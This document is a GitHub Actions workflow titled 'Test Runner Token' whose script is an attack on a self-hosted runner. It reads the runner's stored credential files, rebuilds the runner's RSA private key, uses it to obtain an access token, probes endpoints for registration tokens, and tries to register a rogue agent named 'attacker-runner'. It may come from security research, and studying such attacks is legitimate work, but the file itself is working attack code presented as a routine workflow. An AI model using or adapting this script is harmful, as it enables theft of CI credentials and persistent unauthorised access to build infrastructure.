name: Test Runner Token
on: [push]
jobs:
  find:
    runs-on: self-hosted
    steps:
      - name: Register New Agent
        run: |
          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
          
          pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
          
          python3 -c "
          import json, time, base64, jwt
          import urllib.request, urllib.parse, urllib.error
          from cryptography.hazmat.backends import default_backend
          from cryptography.hazmat.primitives.asymmetric.rsa import (
              RSAPrivateNumbers, RSAPublicNumbers
          )
          
          with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
              params = json.load(f)
          with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
              creds = json.load(f)
          with open('$RUNNER_BASE/.runner', 'r', encoding='utf-8-sig') as f:
              runner = json.load(f)
          
          def b64_to_int(b64):
              b64 += '=' * (4 - len(b64) % 4)
              return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
          
          private_numbers = RSAPrivateNumbers(
              p=b64_to_int(params['p']),
              q=b64_to_int(params['q']),
              d=b64_to_int(params['d']),
              dmp1=b64_to_int(params['dp']),
              dmq1=b64_to_int(params['dq']),
              iqmp=b64_to_int(params['inverseQ']),
              public_numbers=RSAPublicNumbers(
                  e=b64_to_int(params['exponent']),
                  n=b64_to_int(params['modulus'])
              )
          )
          private_key = private_numbers.private_key(default_backend())
          
          client_id = creds['data']['clientId']
          auth_url = creds['data']['authorizationUrl']
          server_url = runner['serverUrl']
          pool_id = runner['poolId']
          agent_id = runner['agentId']
          
          # Get access token
          now = int(time.time())
          payload = {
              'sub': client_id,
              'iss': client_id,
              'aud': auth_url,
              'nbf': now,
              'exp': now + 270,
              'jti': str(now)
          }
          client_assertion = jwt.encode(payload, private_key, algorithm='RS256')
          form_data = urllib.parse.urlencode({
              'grant_type': 'client_credentials',
              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
              'client_assertion': client_assertion,
              'client_id': client_id
          }).encode()
          
          req = urllib.request.Request(
              auth_url, method='POST', data=form_data,
              headers={
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Accept': 'application/json'
              }
          )
          with urllib.request.urlopen(req) as resp:
              access_token = json.loads(resp.read().decode())['access_token']
              print('Access Token Obtained!')
          
          auth_headers = {
              'Authorization': f'Bearer {access_token}',
              'Accept': 'application/json',
              'Content-Type': 'application/json'
          }
          
          # First get full agent details to understand structure
          print('\n=== GET FULL AGENT DETAILS ===')
          req = urllib.request.Request(
              f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}?includeCapabilities=true&includeAssignedRequest=true',
              method='GET',
              headers=auth_headers
          )
          with urllib.request.urlopen(req) as resp:
              agent_data = json.loads(resp.read().decode())
              print(json.dumps(agent_data, indent=2))
          
          # Try to get registration token via correct endpoint
          print('\n=== TRY GENERATE REGISTRATION TOKEN ===')
          
          endpoints = [
              # Try generating token for existing agent
              f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}/registrationtoken',
              # Try pool level registration token
              f'{server_url}_apis/distributedtask/pools/{pool_id}/registrationtoken',
              # Try with api-version
              f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistration?api-version=6.0',
              # Try GitHub Actions specific endpoint
              f'{server_url}_apis/github/runner/registration',
          ]
          
          for ep in endpoints:
              print(f'\n--- {ep} ---')
              try:
                  req = urllib.request.Request(
                      ep, method='GET',
                      headers=auth_headers
                  )
                  with urllib.request.urlopen(req) as resp:
                      print(f'GET SUCCESS:', resp.read().decode()[:300])
              except urllib.error.HTTPError as e:
                  print(f'GET HTTP {e.code}:', e.read().decode()[:200])
              
              try:
                  req = urllib.request.Request(
                      ep, method='POST',
                      data=b'',
                      headers={**auth_headers, 'Content-Length': '0'}
                  )
                  with urllib.request.urlopen(req) as resp:
                      print(f'POST SUCCESS:', resp.read().decode()[:300])
              except urllib.error.HTTPError as e:
                  print(f'POST HTTP {e.code}:', e.read().decode()[:200])
          
          # Try register NEW agent with proper body
          print('\n=== REGISTER NEW AGENT ===')
          
          # Generate new RSA key for fake agent
          from cryptography.hazmat.primitives.asymmetric import rsa
          from cryptography.hazmat.primitives import serialization
          
          new_key = rsa.generate_private_key(
              public_exponent=65537,
              key_size=2048,
              backend=default_backend()
          )
          new_pub = new_key.public_key()
          pub_numbers = new_pub.public_key().public_numbers() if hasattr(new_pub, 'public_key') else new_pub.public_numbers()
          
          def int_to_b64(n):
              length = (n.bit_length() + 7) // 8
              return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).rstrip(b'=').decode()
          
          pub_nums = new_pub.public_numbers()
          
          agent_body = json.dumps({
              'name': 'attacker-runner',
              'version': '2.333.1',
              'osDescription': 'macOS',
              'ephemeral': False,
              'disableUpdate': False,
              'labels': [
                  {'name': 'self-hosted', 'type': 'system'},
                  {'name': 'macOS', 'type': 'system'}
              ],
              'publicKey': {
                  'exponent': int_to_b64(pub_nums.e),
                  'modulus': int_to_b64(pub_nums.n)
              }
          }).encode()
          
          try:
              req = urllib.request.Request(
                  f'{server_url}_apis/distributedtask/pools/{pool_id}/agents',
                  method='POST',
                  data=agent_body,
                  headers=auth_headers
              )
              with urllib.request.urlopen(req) as resp:
                  response = resp.read().decode()
                  print('NEW AGENT REGISTERED!')
                  print(json.dumps(json.loads(response), indent=2))
          except urllib.error.HTTPError as e:
              print(f'HTTP {e.code}:', e.read().decode()[:300])
          "
